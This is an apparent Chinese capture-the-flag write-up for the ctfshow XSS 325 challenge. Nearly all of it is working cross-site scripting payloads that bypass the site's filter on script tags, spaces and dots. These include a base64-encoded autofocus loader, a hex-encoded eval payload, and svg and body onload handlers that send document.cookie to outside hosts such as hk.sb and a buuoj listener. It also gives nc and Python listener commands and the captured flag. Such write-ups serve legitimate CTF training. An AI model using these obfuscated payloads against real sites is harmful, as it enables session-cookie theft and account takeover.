# ctfshow-xss325



##### 参考链接

其他大佬链接

feng  https://ego00.blog.csdn.net/article/details/114079028

Y4	 https://blog.csdn.net/solitudi/article/details/111568030?spm=1001.2014.3001.5501

bit   https://www.xl-bit.cn/index.php/archives/120/



```
圣诞快乐，写下祝福语，生成链接，发送给朋友，可以领取十个鸡蛋！
祝福语
请输入祝福语
 
生成链接
```

```html
既然前面是反射型xss  其实不管它是反射还是存储 
主要还是需要我们利用xss平台 获取cookie


xss平台
https://ww.rs/
https://hk.sb/

应该是过滤了script,img,空格,frame,;,.

输入框输入
<Img sRC=//hk.sb/UfVb/test.jpg>

把空格用tab键替换就可以 或者/
svg 或者body可以绕过
    
<input	onfocus=eval(atob(this.id))	id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vaGsuc2IveTd4eCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=	autofocus>

后面用了buu的公开靶机当个nc监听的服务器
nc -lvp 1104
正常的vps那边是需要nc的，但是nc好像不能持续接收，但是方法其实很多，可以重复起nc，或者我这边就临时拿python起一个临时的服务器，接收一下get参数：
python -m http.server 1104
<svg/onload="window.open('https://hk.sb/y7xx'+document.cookie)">
<body/onload="window.open('https://hk.sb/y7xx'+document.cookie)">

<svg/onload="window.open('http://node4.buuoj.cn:1104/'+document.cookie)">
    <svg	onload="window.open('http://3e8366a0-4e63-4eec-963d-6fa92cad126e.node4.buuoj.cn:1104/'+document.cookie)">
        
        
        
<body/**/onlοad=eval("\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x38\x30\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x38\x32\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x30\x34\x2c\x31\x30\x37\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x31\x32\x31\x2c\x35\x35\x2c\x31\x32\x30\x2c\x31\x32\x30\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b")>    
        
        
        
...不知道为什么 input元素一直不禁用 可以一直通杀
ctfshow{d1baaa04-0d7f-492a-a23c-32ce193b7af0}


```

